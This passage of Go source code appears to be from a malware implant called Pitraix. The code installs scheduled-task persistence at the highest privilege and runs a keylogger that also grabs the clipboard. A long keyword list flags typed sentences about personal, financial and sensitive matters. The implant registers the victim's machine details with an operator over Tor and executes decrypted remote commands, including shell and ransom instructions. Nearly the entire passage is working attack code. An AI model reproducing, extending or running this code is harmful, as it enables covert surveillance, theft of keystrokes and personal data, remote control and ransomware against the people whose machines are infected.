		// destFile_2, _ := os.Create(pitraix_spreadPath)
		copyf(currentPath, pitraix_FilePath)
		// copyf(currentPath, pitraix_spreadPath)

		// time.Sleep(time.Second * 5)
		if isadmin_const {
			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", pitraix_taskName, pitraix_FilePath))
			// fmt.Println("admin!", out)
		} else {
			fmt.Println(`schtasks.exe /CREATE /SC DAILY /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `"`)
			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC DAILY /TN %s /TR %s", pitraix_taskName, pitraix_FilePath))
			// fmt.Println("no :(", out)
		}
	}


	firstTime = !file_Exists(config_FilePath)
	if firstTime {
		AES_Key = random_Bytes(32, true)
		cft.AES_Key = base64.StdEncoding.EncodeToString(AES_Key)
		cft.ContactD = contactDate
		cft.Logs = map[string][]string{"1": {"firstTime", "Created config file ", contactDate}}
		cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
		cft.Modules = map[string][]string{"0": {}}
		cft.RegTmp  = []string{}
		cft.RoutesH = []string{}
		cft.Register = false

		out, _ := json.Marshal(cft)
		pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
		f, _ := os.Create(config_FilePath)
		f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
		f.Close()
		// if err != nil {
		// 	fmt.Println("Error creating config file!", config_FilePath, err)
		// }


		// pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
		// f.WriteString(pl_encoded)
		// f.Close()
		// // confAsyncChn <- fmt.Sprintf("aes|%s", key_encoded)
		// // confAsyncChn <- fmt.Sprintf("contactd|%s", contactDate)
		// // fmt.Println(cft.AES_Key, cft.ContactD)
		// fmt.Println("Created config file!")	
	
		// cft.AES_Key = AES_Key
		// cft.ContactD = contactD
	}
	cft.updateConf("fetch", []string{})

	go confUpdaterAsync()
	
	klogChn1 := make(chan string)

	go func(klogChn1 chan string) { // Key logger parser
		eventsIndicators := []string{
			// offensive / porn / child porn
			"fuck",
			"shit",
			"sex",
			"dick",
			"cock",
			"pussy",
			"ass",
			"tit",
			"balls",
			"young",
			"kid",
			"teen",
			"child",
			"cp",
			"loli",
			"porn",
			"xx",
			"xvideos",
			"xnxx",
			"tra",
			"gay",
			"lgb",
			"blow",
			"rape",
			"stalk",
			"horny",
			"naked",
			"hardcore",
			"softcore",
			"bre",
			"straight",
			"girl",
			"fur",
			"cub",
			"prostitut",

			// family terms
			"mom",
			"mother",
			"dad",
			"father",
			"sis",
			"brother",
			"sibling",
			"uncle",
			"aunt",
			"cousin",

			// extremeist / racist / homophobic
			"al qaeda",
			"isis",
			"islamic",
			"jihad",
			"muslim state",
			"nazi",
			"hitler",
			"ww1",
			"ww2",
			"ww3",
			"ww4",
			"www.",
			"world",
			"would",
			"white",
			"black",
			"jew",
			"nig",
			"neg",
			"war",
			"revenge",
			"grudge",
			"blood",
			"fag",
			"homemade",
			"hate",
			"iraq",
			"syria",
			"flight",
			"plan",
			"drone",
			"nuclear",
			"nuke",
			"bomb",
			"explosive",
			"sho",
			"guns",
			"glock",
			"pistol",
			"rifle",
			"suicid",
			"weapon",
			"kill",
			"pathetic",
			"weak",
			"strong",
			"crew",
			"border",
			"customs",
			"discord",
			"virus",
			"chemical",
			"pro",
			"betray",
			"how to",
			"manual",
			"going to",
			"will",
			"troll",

			// tech aware / researcher / hacker / cracker / fraudster
			"vpn",
			"proxy",
			"password",
			"hid",
			"tor",
			"the onion router",
			"hack",
			"crack",
			"engineer",
			"spam",
			"fullz",
			"log",
			"i2p",
			"freenet",
			"whonix",
			"qube",
			"tails",
			"usb",
			"dox",
			"opsec",
			"info",
			"sell",
			"buy",
			"ubuntu",
			"debian",
			"manjaro",
			"arch",
			"fedora",
			"harden",
			"bot",
			"malware",
			"data",
			"dev",
			"psyop",
			"op",
			"vacation",
			"program",
			"python",
			"c++",
			"c#",
			"binary",
			"java",
			"javascript",
			"golang",
			"html",
			"css",
			"cypher",
			"cipher",
			"zero",
			"0",
			"exploit",
			"metasploit",
			"facebook",
			"twitter",
			"link",
			"youtube",
			"google",
			"duckduckgo",
			"resume",
			"website",
			"blog",
			"site",
			"game",
			"admin",
			"mod",
			"onion",
			"monero",
			"bitcoin",
			"ether",
			"crypt",
			"encrypt",
			"sign",
			"decrypt",
			"coin",
			"byte",
			"bit",
			"mixer",
			"amd",
			"intel",
			"nvidia",
			"linux",
			"problem",
			"windows",
			"unix",
			"bsd",
			"assembly",
			"card",
			"visit",
			"email",
			"slack",
			"irc",
			"jabber",
			"xmpp",
			"matrix",
			"element",
			"client",
			"user",
			"blackmail",
			"dark",
			"deep",
			"cyber",
			"privacy",
			"security",
			"learn",
			"teach",
			"var",
			"scam",
			"http",
			"bought",
			"spread",
			"profile",
			"nord",
			"express",
			"firefox",
			"chrome",

			// bank info / goverment employee / spy
			"nsa",
			"national security",
			"agency",
			"fbi",
			"addict",
			"federal",
			"fed",
			"cia",
			"mossad",
			"office",
			"agent",
			"operat",
			"officer",
			"bank",
			"money",
			"cash",
			"credit",
			"debt",
			"social",
			"cop",
			"spy",
			"deploy",
			"military",
			"sector",
			"lake city",
			"quiet pill",
			"spooks",
			"jail",
			"prison",
			"torture",
			"homeland",
			"motherland",
			"goverment",
			"work",
			"job",
			"poor",
			"rich",
			"wealthy",
			"welfare",
			"shin",
			"bnd",
			"dod",
			"meeting",
			"schedule",
			"heading to",
			"van",
			"car",
			"boat",
			"charge",

			// drug addict
			"drug",
			"date",
			"meth",
			"tramadol",
			"weed",
			"cig",
			"alcohol",
			"xanax",
			"mushroom",
			"heroin",
			"tar",
			"fentanyl",
			"coke",
			"cocaine",
			"mdma",
			"marijuana",
			"oxycodone",
			"morphine",
			"steroid",
			"overdose",
			"angel",
			
			// private info / clues / misc
			"depress",
			"homework",
			"friend",
			"age",
			"name",
			"location",
			"country",
			"city",
			"live",
			"from",
			"israel",
			"iran",
			"egypt",
			"tired",
			"europe",
			"latin",
			"old",
			"america",
			"north",
			"south",
			"africa",
			"east",
			"asia",
			"arab",
			"american",
			"african",
			"food",
			"closed",
			"cook",
			"cancer",
			"german",
			"moving",			
			"study",
			"college",
			"school",
			"daycare",
			"sleep",
			"slept",
			"bed",
			"love",
			"like",
			"dislike",
			"scared",
			"scary",
			"terrifying",
			"anime",
			"cartoon",
			"devil",
			"satan",
			"god",
			"hell",
			"heaven",
			"tiktok",
			"android",
			"iphone",
			"open",
			"dog",
			"cat",
			"noob",
			"soccer",
			"baseball",
			"basketball",
			"virign",
			"i am",
			"i'm",
			"im",
			"name",
			"nick",
			"wife",
			"house",
			"home",
			"apartment",
			"garage",
			"door",
			"paid",
			"pay",
			"dollar",
			"euro",
			"free",
			"holy",
			"omg",
		}
		for sentence := range klogChn1 {
			words := strings.Fields(sentence)
			match := false
			for _, w := range words {
				if match {
					break
				}
				for _, w2 := range eventsIndicators {
					if strings.HasPrefix(strings.ToLower(w), w2) || strings.HasPrefix(strings.ToLower(sentence), w2){ // contains strings start
						fmt.Println("word match!", w)
						match = true
						break
					}
				}
			}

			if match == true {
				fmt.Println("keylog event match:", sentence)
				event("keylog", sentence)
			} else {
				fmt.Println("uninteresting:", sentence)
			}
		}
	}(klogChn1)

	go func(klogChn1 chan string) { // Raw logger passer
		/* 
			should increase/decrease dyniamcally when 
			key  was recently presseddecrease to 5; if key been while pressed, increase to 50 etc
		*/
		delayKeyfetchMS := time.Duration(50) 
		// emptyCount := 0

		var tmpKeylog string
		var capsLock bool = false
		
		var shiftPressed bool = false
		var ctrlPressed bool = false

		specialchars := map[int]string{
			0x30: ")",
			0x31: "!",
			0x32: "@",
			0x33: "#",
			0x34: "$",
			0x35: "%",
			0x36: "^",
			0x37: "&",
			0x38: "*",
			0x39: "(",
			0xBD: "_",
			0xBB: "+",
			0xBC: "<",
			w32.VK_OEM_1: ":",
			w32.VK_OEM_2: "?",
			w32.VK_OEM_3: "~",
			w32.VK_OEM_4: "{",
			w32.VK_OEM_5: "|",
			w32.VK_OEM_6: "}",
			w32.VK_OEM_7: "\"",
			w32.VK_OEM_PERIOD: ">",
		}
		
		// detected := false
		// var detected_low int 
		// var detected_high int
		var last_val int = 65
		var val_confirmed = -1
		for {
			for key := 0; key <= 256; key++ {
				val, _, _ := procGetAsyncKeyState.Call(uintptr(key))
				// if detected_high == 0 {
				// 	detected_low = val
				// } else if detected_low == 0 {
				// 	detected_high = val
				// }
				if val_confirmed == -1 {
					if int(val) > last_val {
						last_val = int(val)
					} else if int(val) < last_val && int(val) != 0 {
						val_confirmed = last_val
					}
				}

				if int(val) == val_confirmed {
					// fmt.Println(key, val)
					fmt.Println(key)
					switch key {
					case w32.VK_CONTROL:
						ctrlPressed = true
						// tmpKeylog += "[Ctrl]"
					case w32.VK_LCONTROL:
						ctrlPressed = true
						// tmpKeylog += "[LeftCtrl]"
					case w32.VK_RCONTROL:
						ctrlPressed = true
						// tmpKeylog += "[RightCtrl]"
					case w32.VK_BACK:
						if len(tmpKeylog) != 0 {
							tmpKeylog = tmpKeylog[:len(tmpKeylog) - 1]
						}
					case w32.VK_TAB:
						tmpKeylog += "[Tab]"
					case w32.VK_RETURN, 1:
						// tmpKeylog += "[Enter]\r\n"
						if strings.TrimSpace(tmpKeylog) != "" {
							klogChn1 <- tmpKeylog
							tmpKeylog = ""
						}
					case w32.VK_SHIFT:
						shiftPressed = true
						// tmpKeylog += "[Shift]"
					case w32.VK_MENU:
						tmpKeylog += "[Alt]"
					case w32.VK_CAPITAL:
						// tmpKeylog += "[CapsLock]"
						capsLock = !capsLock
					case w32.VK_ESCAPE:
						tmpKeylog += "[Esc]"
					case w32.VK_SPACE:
						tmpKeylog += " "
					case w32.VK_PRIOR:
						tmpKeylog += "[PageUp]"
					case w32.VK_NEXT:
						tmpKeylog += "[PageDown]"
					case w32.VK_END:
						tmpKeylog += "[End]"
					case w32.VK_HOME:
						tmpKeylog += "[Home]"
					case w32.VK_LEFT:
						tmpKeylog += "[Left]"
					case w32.VK_UP:
						tmpKeylog += "[Up]"
					case w32.VK_RIGHT:
						tmpKeylog += "[Right]"
					case w32.VK_DOWN:
						tmpKeylog += "[Down]"
					case w32.VK_SELECT:
						tmpKeylog += "[Select]"
					case w32.VK_PRINT:
						tmpKeylog += "[Print]"
					case w32.VK_EXECUTE:
						tmpKeylog += "[Execute]"
					case w32.VK_SNAPSHOT:
						tmpKeylog += "[PrintScreen]"
					case w32.VK_INSERT:
						tmpKeylog += "[Insert]"
					case w32.VK_DELETE:
						tmpKeylog += "[Delete]"
					case w32.VK_HELP:
						tmpKeylog += "[Help]"
					// case w32.VK_LWIN:
					// 	tmpKeylog += "[LeftWindows]" ////////////////////////////////////////////////
					// case w32.VK_RWIN:
					// 	tmpKeylog += "[RightWindows]" ////////////////////////////////////////////////
					case w32.VK_APPS:
						tmpKeylog += "[Applications]"
					case w32.VK_SLEEP:
						tmpKeylog += "[Sleep]"
					case w32.VK_NUMPAD0:
						tmpKeylog += "[Pad 0]"
					case w32.VK_NUMPAD1:
						tmpKeylog += "[Pad 1]"
					case w32.VK_NUMPAD2:
						tmpKeylog += "[Pad 2]"
					case w32.VK_NUMPAD3:
						tmpKeylog += "[Pad 3]"
					case w32.VK_NUMPAD4:
						tmpKeylog += "[Pad 4]"
					case w32.VK_NUMPAD5:
						tmpKeylog += "[Pad 5]"
					case w32.VK_NUMPAD6:
						tmpKeylog += "[Pad 6]"
					case w32.VK_NUMPAD7:
						tmpKeylog += "[Pad 7]"
					case w32.VK_NUMPAD8:
						tmpKeylog += "[Pad 8]"
					case w32.VK_NUMPAD9:
						tmpKeylog += "[Pad 9]"
					case w32.VK_MULTIPLY:
						tmpKeylog += "*"
					case w32.VK_ADD:
						tmpKeylog += "+"
					case w32.VK_SEPARATOR:
						tmpKeylog += "[Separator]"
					case w32.VK_SUBTRACT:
						tmpKeylog += "-"
					case w32.VK_DECIMAL:
						tmpKeylog += "."
					case w32.VK_DIVIDE:
						tmpKeylog += "[Devide]"
					case w32.VK_F1:
						tmpKeylog += "[F1]"
					case w32.VK_F2:
						tmpKeylog += "[F2]"
					case w32.VK_F3:
						tmpKeylog += "[F3]"
					case w32.VK_F4:
						tmpKeylog += "[F4]"
					case w32.VK_F5:
						tmpKeylog += "[F5]"
					case w32.VK_F6:
						tmpKeylog += "[F6]"
					case w32.VK_F7:
						tmpKeylog += "[F7]"
					case w32.VK_F8:
						tmpKeylog += "[F8]"
					case w32.VK_F9:
						tmpKeylog += "[F9]"
					case w32.VK_F10:
						tmpKeylog += "[F10]"
					case w32.VK_F11:
						tmpKeylog += "[F11]"
					case w32.VK_F12:
						tmpKeylog += "[F12]"
					case w32.VK_NUMLOCK:
						tmpKeylog += "[NumLock]"
					case w32.VK_SCROLL:
						tmpKeylog += "[ScrollLock]"
					case w32.VK_LSHIFT:
						shiftPressed = true
						// tmpKeylog += "[LeftShift]"
					case w32.VK_RSHIFT:
						shiftPressed = true
						// tmpKeylog += "[RightShift]"
					case w32.VK_LMENU:
						tmpKeylog += "[LeftMenu]"
					case w32.VK_RMENU:
						tmpKeylog += "[RightMenu]"
					case 0x30,
					0x31,
					0x32,
					0x33,
					0x34,
					0x35,
					0x36,
					0x37,
					0x38,
					0x39,
					0xBD,
					0xBB,
					0xBC,
					w32.VK_OEM_1,
					w32.VK_OEM_2,
					w32.VK_OEM_3,
					w32.VK_OEM_4,
					w32.VK_OEM_5,
					w32.VK_OEM_6,
					w32.VK_OEM_7,
					w32.VK_OEM_PERIOD:
						if shiftPressed == true {
							tmpKeylog += specialchars[key]
							shiftPressed = false
						} else {
							if key == w32.VK_OEM_3 {
								tmpKeylog += "`"
							} else if key == 189 {
								tmpKeylog += "-"
							} else if key == 187 {
								tmpKeylog += "="
							} else if key == w32.VK_OEM_1 {
								tmpKeylog += ";"
							} else if key == w32.VK_OEM_2 {
								tmpKeylog += "/"
							} else if key == w32.VK_OEM_4 {
								tmpKeylog += "["
							} else if key == w32.VK_OEM_5 {
								tmpKeylog += "\\"
							} else if key == w32.VK_OEM_6 {
								tmpKeylog += "]"
							} else if key == w32.VK_OEM_7 {
								tmpKeylog += "'"
							} else if key == w32.VK_OEM_PERIOD {
								tmpKeylog += "."
							} else if key == 0xBC {
								tmpKeylog += ","
							} else {
								tmpKeylog += string(key)
							}
						}
					case 0x41,
					0x42,
					0x43,
					0x44,
					0x45,
					0x46,
					0x47,
					0x48,
					0x49,
					0x4A,
					0x4B,
					0x4C,
					0x4D,
					0x4E,
					0x4F,
					0x50,
					0x51,
					0x52,
					0x53,
					0x54,
					0x55,
					0x56,
					0x57,
					0x58,
					0x59,
					0x5A:
						// emptyCount = 0

						if ctrlPressed && (key == 0x56 || key == 0x43) {
							text, _ := clipboard.ReadAll()
							fmt.Println("clipboard:", text)
							ctrlPressed = false
						} else if capsLock {
							tmpKeylog += string(key)
						} else {
							tmpKeylog += strings.ToLower(string(key))
						}
					}
				}
			}
			// fmt.Println(emptyCount, delayKeyfetchMS)
			// if emptyCount > 500 {
			// 	if delayKeyfetchMS != 500 {
			// 		delayKeyfetchMS++
			// 	}
			// } else {
			// 	emptyCount++
			// 	delayKeyfetchMS = 5
			// }
			time.Sleep(delayKeyfetchMS)
		}
	}(klogChn1)

	log("Starting", "Fetching IP info")

	var ipinfo_struct ipInfo
	for { // detect firewall'd enviroments
		ipinfo_req, err := getRequest("https://ipinfo.io/json", false, 10)
		if err != nil {
			// if iperror_count == 9 {
			// 	// outdated certitifcates bypass
			// 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
			// 	fmt.Println("####### IMPORTANT ####### InsecureSkipVerify: true")
			// } else {
			// 	iperror_count++
			// }
			fmt.Println(ipinfo_req, err)
			time.Sleep(time.Second * 5)
			continue
		}
		// fmt.Println(string(ipinfo_req), err)
		json.Unmarshal(ipinfo_req, &ipinfo_struct)
		break
	}
	if ipinfo_struct.Country == "IL" {
		fmt.Println("Shalom")
		os.Exit(0) // I love you
	}


	hstAddress := setupTor(tor_FolderPath, torPort, tor_FolderName, &ipinfo_struct, false)
	fmt.Println("Address", hstAddress)
	if firstTime {
		file, _ := os.Open(pitraix_FilePath) // pitraix_spreadPath)
		fs, _ := file.Stat()
		b := make([]byte, fs.Size())
	
		for {
			_, err := file.Read(b)
			if err != nil {
				break
			}
		}
		file.Close()
	
		nb := bytes.Replace(b, []byte(agentAddress), []byte(hstAddress), 1)
	
		// fmt.Println(nb)
	
		f, _ := os.Create(pitraix_FilePath) // pitraix_spreadPath)
		f.Write(nb)
		f.Close()
	}
	
	if certError_Count == 5 { // outdated certificates fix
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: false} // secure connection back
	}

	opPubEncryptionKeyProcessed, _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes)
	opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)


	if opPubSigningKeyProcessed == opPubEncryptionKeyProcessed {
		log("WARNING", "OPER signing key is same as encryption key! this is highly recommended against")
	}

	// onetimeKey := base64.StdEncoding.EncodeToString(random_Bytes(32, true))

	encryptedMessage_register := RSA_OAEP_Encrypt(AES_Key, *opPubEncryptionKeyProcessed)
	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, arch, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
	registerData := fmt.Sprintf("%s|%s|%s", encryptedMessage_register, base64.StdEncoding.EncodeToString(encrypted_registerData), base64.StdEncoding.EncodeToString(nonce))

	// first time register logic
	for {
		fmt.Println("firstTime:", firstTime, "cft.Register:", cft.Register)
		if firstTime == false && cft.Register == true {
			fmt.Println("stopped")
			break
		}
		
		// log("Register", "Attempting to register with Agent: " + agentAddress)
		fmt.Println("Attempting to register with Agent", agentAddress)
		response, err := postRequest("http://" + agentAddress + ".onion", []byte(registerData), true, 25)	 
		if err != nil {
			log("Register", "Error") // + err.Error())
			// fmt.Println("Error contacting Agent to register. ", err)
			time.Sleep(2 * time.Second) // DEBUG Increase to 2-9 seconds via randomizer later
		} else {
			fmt.Println("Respone: ", string(response), err)

			if string(response) == "1" {
				cft.updateConf("register", []string{"true"})
				// confAsyncChn <- []string{"register", "true"}
				firstTime = false
				// time.Sleep(5 * time.Second)
			}
			// cft.updateConf(locAES_Key, cft.AES_Key, cft.ContactD) //, username, cpu, cpuVendor, userHomeDIR)
			
		}
	}
	
	// normal cell setup
	log("Cell", "Setting up cell")
	fmt.Println("Setting up cell")

	var antiddosCounter int = 0

	go func(antiddosCounter *int) {
		for {
			if *antiddosCounter == 0 {
				time.Sleep(1 * time.Second)
			} else {
				time.Sleep(5 * time.Second)
				*antiddosCounter = *antiddosCounter - 5
			}
		}
	}(&antiddosCounter)

	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
		req.Body = http.MaxBytesReader(writer, req.Body, 3000) // if anything wrong, its prolly dis bitch
		if req.Method == "GET" {
			io.WriteString(writer, "")
			log("Foreign - GET", "Received GET request")
			fmt.Println("Got GET request! ", req.Body)
		} else if req.Method == "POST" {
			reqBody, _ := ioutil.ReadAll(req.Body)
			if len(reqBody) > 0 && isASCII(string(reqBody)) {
				dataSlice := strings.Split(string(reqBody), "|")
				fmt.Println(dataSlice)
				if len(dataSlice) == 3 { // register
					if antiddosCounter == 0 {
						antiddosCounter = ddosCounter
						confAsyncChn <- []string{"regtmp", string(reqBody)}
						io.WriteString(writer, "1")
					} else {
						fmt.Println("anti ddos caught something", antiddosCounter, dataSlice)
						go log("Foreign - POST", "anti ddos caught something! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
					}
				} else if len(dataSlice) == 2 { // instrctuion
					temp_decipher, _ := base64.StdEncoding.DecodeString(dataSlice[0])
					temp_nonce   , _ := base64.StdEncoding.DecodeString(dataSlice[1])
					fmt.Println(temp_decipher, temp_nonce) // , base64.StdEncoding.EncodeToString(cft.AES_Key))
					if len(temp_nonce) != 12 {
						go log("Foreign - POST", "Invalid nonce length: " + strconv.Itoa(len(temp_nonce)) + ". DataSlice: " + dataSlice[0] + " " + dataSlice[1])
						fmt.Println("Invalid nonce length given!", len(temp_nonce), temp_nonce)
					} else {
						decipher, err := decrypt_AES(temp_decipher, temp_nonce, AES_Key)
						if err != nil {
							go log("Foreign - POST", "Error while decrypting cipher! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
						} else {
							var instructions = []string{} // instruType
							err := json.Unmarshal(decipher, &instructions)
							if err != nil {
								go log("Foreign - POST", "Error while unmarshalling! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
							} else {
								var shouldLog bool = true
								var final_output string
								for index, instru := range instructions {
									fmt.Println("INSTRUCTION:", index, instru)
									instru_split := strings.Split(instru, " ")
									if len(instru_split) == 0 {
										fmt.Println("wtf?", index, instru)
										go log("Foreign - POST", "Received ZERO INSTRUCTIONS: " + string(decipher))
									} else {
										if instru_split[0] == "ransom" || instru_split[0] == "decrypt" {
											shouldLog = false
										}
										final_output += strings.TrimSpace(doInstru(instru_split[0], instru[len(instru_split[0]) + 1:])) + " <PiTrIaXMaGGi$N$9a1n>"
									}
								}
								if shouldLog == true{
									go log("Foreign - POST", "Received instructions: " + string(decipher))
								}
								fmt.Println("Received instructions:",err, len(instructions), string(decipher))

								final_output = strings.TrimSpace(final_output) // [:len(final_output) - 2]
								output_enc, nonce_enc, _ := encrypt_AES([]byte(final_output), AES_Key)
								output_encode := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(output_enc), base64.StdEncoding.EncodeToString(nonce_enc))
								io.WriteString(writer, output_encode)
							}
						}
					}
				} else {
					go log("Foreign - POST", "Received POST request without data length 2: " + strconv.Itoa(len(dataSlice)))
					// fmt.Println("Got POST request without DataSlice 2! ", dataSlice, len(dataSlice))
				}
			} else {
				go log("Foreign - POST", "Received POST request without valid data: " + string(reqBody))
				fmt.Println("Got POST request without valid data! %v %v\n", reqBody, string(reqBody))
			}
			
		} else {
			go log("Foreign - UNKNOWN", "Received request of unknown method: " + req.Method)
			fmt.Println("Hello Fake", req.Method)
		}
	})
	fmt.Println(http.ListenAndServe("127.0.0.1:" + torPort, nil))
}

func tor_running_check() bool {
	ports := []string{"9050"} // , "9150"}
	tor_running := true
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
		if err != nil {
			tor_running = false
		}
		if conn != nil {
			tor_running = true
			conn.Close()
			break
		}
	}
	return tor_running
}

func postRequest(target_url string, data []byte, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}

	req, _ := http.NewRequest("POST", target_url, bytes.NewBuffer(data))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func getRequest(target_url string, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}
	
	req, _ := http.NewRequest("GET", target_url, nil)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func decrypt_AES(cipher_Text []byte, nonce []byte, key []byte) ([]byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, err
	}

	decrypted_Cipher, err := gcm.Open(nil, nonce, cipher_Text, nil)
	if err != nil {
		return []byte{}, err
	}

	return decrypted_Cipher, nil
}

func encrypt_AES(text []byte, key []byte) ([]byte, []byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	return gcm.Seal(nil, nonce, text, nil), nonce, nil
}

func create_signature(msg []byte, privateKey rsa.PrivateKey) ([]byte, []byte, error) {
	msgHash := sha512.New()
	_, err := msgHash.Write(msg)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	msgHashSum := msgHash.Sum(nil)
	signature, err := rsa.SignPSS(rand.Reader, &privateKey, crypto.SHA512, msgHashSum, nil)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	
	return signature, msgHashSum, nil
}

func verify_signature(publicKey rsa.PublicKey, msgHashSum []byte, signature []byte) error {
	err := rsa.VerifyPSS(&publicKey, crypto.SHA512, msgHashSum, signature, nil)
	if err != nil {
		return err
	}

	return nil
}

func RSA_OAEP_Encrypt(secretMessage []byte, publicKey rsa.PublicKey) string {
    rng := rand.Reader
    ciphertext, err := rsa.EncryptOAEP(sha512.New(), rng, &publicKey, secretMessage, nil)
	if err != nil {
        fmt.Println(err)
    }
    return base64.StdEncoding.EncodeToString(ciphertext)
}
 
func RSA_OAEP_Decrypt(cipherText string, privateKey rsa.PrivateKey) []byte {
    ct, _ := base64.StdEncoding.DecodeString(cipherText)
    rng := rand.Reader
    plaintext, err := rsa.DecryptOAEP(sha512.New(), rng, &privateKey, ct, nil)
    if err != nil {
        fmt.Println(err)
    }
    return plaintext
}

func random_Bytes(l int, t bool) []byte {
	b := make([]byte, l)
	if t == true { // secure rand
		rand.Read(b)
	} else {
		rdmod.Read(b)
	}

	return b
}

func file_Exists(filePath string) bool {
	_, err := os.Stat(filePath)
	return !os.IsNotExist(err)
}

func inFindStr(a string, list []string) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}
